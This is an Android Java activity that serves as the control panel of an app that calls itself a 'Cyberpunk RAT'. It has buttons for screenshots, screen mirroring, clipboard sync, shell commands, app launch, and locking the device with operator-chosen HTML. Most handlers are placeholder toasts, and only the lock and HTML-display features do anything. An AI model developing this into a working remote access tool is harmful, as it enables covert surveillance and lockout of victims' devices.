package com.fxtp.agent;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class ControlPanelActivity extends AppCompatActivity {

    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        statusText = findViewById(R.id.statusText);

        Button btnConnect = findViewById(R.id.btnConnect);
        Button btnScreenshot = findViewById(R.id.btnScreenshot);
        Button btnMirror = findViewById(R.id.btnMirror);
        Button btnStopMirror = findViewById(R.id.btnStopMirror);
        Button btnNotify = findViewById(R.id.btnNotify);
        Button btnClipboard = findViewById(R.id.btnClipboard);
        Button btnShell = findViewById(R.id.btnShell);
        Button btnLaunch = findViewById(R.id.btnLaunch);
        Button btnLock = findViewById(R.id.btnLock);
        Button btnHtml = findViewById(R.id.btnHtml);
        Button btnBack = findViewById(R.id.btnBack);

        btnConnect.setOnClickListener(v -> {
            statusText.setText("🔄 Connecting...");
            Toast.makeText(this, "Connection initiated", Toast.LENGTH_SHORT).show();
        });

        btnScreenshot.setOnClickListener(v -> {
            Toast.makeText(this, "📸 Screenshot captured", Toast.LENGTH_SHORT).show();
        });

        btnMirror.setOnClickListener(v -> {
            Toast.makeText(this, "🖥️ Mirror started", Toast.LENGTH_SHORT).show();
        });

        btnStopMirror.setOnClickListener(v -> {
            Toast.makeText(this, "⏹️ Mirror stopped", Toast.LENGTH_SHORT).show();
        });

        btnNotify.setOnClickListener(v -> {
            Toast.makeText(this, "🔔 Notification sent", Toast.LENGTH_SHORT).show();
        });

        btnClipboard.setOnClickListener(v -> {
            Toast.makeText(this, "📋 Clipboard synced", Toast.LENGTH_SHORT).show();
        });

        btnShell.setOnClickListener(v -> {
            Toast.makeText(this, "💻 Shell command executed", Toast.LENGTH_SHORT).show();
        });

        btnLaunch.setOnClickListener(v -> {
            Toast.makeText(this, "🚀 App launched", Toast.LENGTH_SHORT).show();
        });

        btnLock.setOnClickListener(v -> {
            Intent lockIntent = new Intent(this, LockActivity.class);
            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(lockIntent);
        });

        btnHtml.setOnClickListener(v -> {
            android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
            builder.setTitle("Enter HTML to display on device");
            final android.widget.EditText input = new android.widget.EditText(this);
            input.setText("<h1 style='color:#00f0ff;'>FXTP</h1><p>Cyberpunk RAT</p>");
            builder.setView(input);
            builder.setPositiveButton("Display", (dialog, which) -> {
                String html = input.getText().toString();
                Intent intent = new Intent(this, LockActivity.class);
                intent.putExtra("html_content", html);
                intent.putExtra("display_html", true);
                startActivity(intent);
            });
            builder.setNegativeButton("Cancel", null);
            builder.show();
        });

        btnBack.setOnClickListener(v -> finish());
    }
}
